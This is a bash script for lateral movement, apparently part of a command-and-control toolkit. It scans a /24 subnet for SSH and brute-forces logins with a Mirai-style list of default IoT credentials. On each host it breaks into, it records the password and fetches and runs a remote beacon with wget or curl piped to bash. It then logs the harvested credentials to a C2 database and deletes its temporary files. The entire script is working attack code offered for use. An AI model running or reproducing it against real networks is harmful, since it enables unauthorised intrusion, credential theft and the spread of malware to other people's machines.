#!/bin/bash
# LATERAL PUSHER v1 — Deployed by TCP Slayer via SSH executor bridge
# Scans 192.168.141.0/24 for SSH targets with common creds
# Reports results back to hybrid_c2.db intel table
#
# Usage: /opt/chimera/lateral_pusher.sh <attacker_ip> <protocol>
# (attacker_ip and protocol are optional — passed from slayer trigger)

ATTACKER_IP="${1:-unknown}"
PROTOCOL="${2:-tcp}"
DB_PATH="/opt/c2/hybrid_c2.db"
LATERAL_TARGETS="/tmp/lateral_targets_$$.txt"
RESULTS_LOG="/tmp/lateral_results_$$.log"
MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
MY_HOSTNAME=$(hostname 2>/dev/null)
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Common SSH credentials for brute
CREDS=(
    "root:root"
    "root:admin"
    "root:password"
    "root:123456"
    "root:pass"
    "root:toor"
    "root:default"
    "admin:admin"
    "admin:password"
    "admin:123456"
    "admin:pass"
    "admin:root"
    "user:user"
    "user:password"
    "user:123456"
    "guest:guest"
    "support:support"
    "plcm_sp_ip:plcm_sp_ip"
    "root:xc3511"
    "root:vizxv"
    "root:anko"
    "root:Zte521"
    "root:realtek"
    "root:0"
    "root:54321"
    "root:12345"
    "root:admin123"
    "root:xmhdipc"
    "root:juantech"
    "root:7ujMko0vizxv"
    "root:7ujMko0admin"
    "root:system"
    "root:smcadmin"
    "root:1234"
    "root:defaultpass"
    "root:pass123"
    "root:letmein"
)

# --- FUNCTIONS ---

log_result() {
    local target="$1"
    local user="$2"
    local pass="$3"
    local status="$4"   # success | fail | timeout
    local details="$5"

    echo "$(date -u +"%H:%M:%S")|$target|$user|$pass|$status|$details" >> "$RESULTS_LOG"
}

report_to_intel() {
    # Batch report results back to C2 via SQLite
    if [ ! -f "$RESULTS_LOG" ] || [ ! -s "$RESULTS_LOG" ]; then
        return
    fi

    # Process results and insert into intel table
    while IFS='|' read -r ts target user pass status details; do
        # Generate UUID for intel record
        local data_line
        data_line="LATERAL|pusher=$MY_IP|target=$target|user=$user|pass=$pass|status=$status|trigger=$ATTACKER_IP|proto=$PROTOCOL|ts=$TIMESTAMP|detail=$details"

        sqlite3 "$DB_PATH" \
            "INSERT INTO intel (id, source, data, type, collected_at) VALUES (
                '$(uuidgen 2>/dev/null || echo "LAT-$$-$RANDOM")',
                'lateral_pusher:$MY_IP',
                '$data_line',
                'lateral_brute',
                datetime('now')
            );" 2>/dev/null
    done < "$RESULTS_LOG"

    echo "[$(date -u +"%H:%M:%S")] Reported $(wc -l < "$RESULTS_LOG") results to intel table"
}

scan_subnet() {
    local subnet="192.168.141.0/24"
    echo "[$(date -u +"%H:%M:%S")] Scanning $subnet for SSH (port 22)..."

    # Use /dev/tcp if available (bash built-in)
    for host in $(seq 1 254); do
        local ip="192.168.141.$host"
        # Fast port check using bash built-in
        timeout 2 bash -c "echo >/dev/tcp/$ip/22" 2>/dev/null && {
            echo "$ip" >> "$LATERAL_TARGETS"
            echo "[$(date -u +"%H:%M:%S")] Found open SSH: $ip"
        } &
    done
    wait
}

brute_targets() {
    if [ ! -f "$LATERAL_TARGETS" ] || [ ! -s "$LATERAL_TARGETS" ]; then
        echo "[$(date -u +"%H:%M:%S")] No SSH targets found in 192.168.141.0/24"
        return
    fi

    local total=$(wc -l < "$LATERAL_TARGETS")
    local found=0
    echo "[$(date -u +"%H:%M:%S")] Brute-forcing $total SSH targets..."

    while IFS= read -r target; do
        [ -z "$target" ] && continue
        for cred in "${CREDS[@]}"; do
            local user="${cred%%:*}"
            local pass="${cred##*:}"

            # Try SSH login
            local result
            result=$(timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=3 -o BatchMode=yes \
                "$user@$target" "hostname" 2>/dev/null)

            if [ $? -eq 0 ]; then
                echo "[$(date -u +"%H:%M:%S")] *** VALID: $user:$pass @ $target ***"
                log_result "$target" "$user" "$pass" "success" "$(echo "$result" | head -1)"
                found=$((found + 1))

                # Deploy beacon to the newly-owned host
                timeout 10 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
                    -o ConnectTimeout=5 "$user@$target" \
                    "echo 'root:$pass' | tee -a /tmp/.owned; \
                     echo 'LATERAL_INFECTED|$MY_IP|$TIMESTAMP' >> /tmp/.slayer.log; \
                     if command -v wget >/dev/null 2>&1; then
                         wget -q -O- http://127.0.0.1:10001/beacon.sh 2>/dev/null | bash &
                     elif command -v curl >/dev/null 2>&1; then
                         curl -s http://127.0.0.1:10001/beacon.sh 2>/dev/null | bash &
                     fi" 2>/dev/null &

                break  # Move to next target once we find valid creds
            fi
        done
    done < "$LATERAL_TARGETS"

    echo "[$(date -u +"%H:%M:%S")] Brute complete: $found/$total targets owned"
}

cleanup() {
    rm -f "$LATERAL_TARGETS" "$RESULTS_LOG"
}

# --- MAIN ---

echo "=============================================="
echo " LATERAL PUSHER v1"
echo " Deployed by TCP Slayer from $ATTACKER_IP"
echo " Protocol: $PROTOCOL"
echo " Running on: $MY_HOSTNAME ($MY_IP)"
echo " Timestamp: $TIMESTAMP"
echo "=============================================="

# Ensure we have required tools
for tool in sshpass ssh sqlite3 timeout; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "WARNING: $tool not found — some functionality may be limited"
    fi
done

# Write trigger marker
echo "SLAYER_TRIGGER|$ATTACKER_IP|$PROTOCOL|$TIMESTAMP|$MY_IP" >> /tmp/.slayer.log 2>/dev/null

# Phase 1: Scan for SSH targets
scan_subnet

# Phase 2: Brute-force found targets
brute_targets

# Phase 3: Report to C2
report_to_intel

# Phase 4: Cleanup
cleanup

echo "=============================================="
echo " LATERAL PUSHER COMPLETE"
echo "=============================================="
exit 0
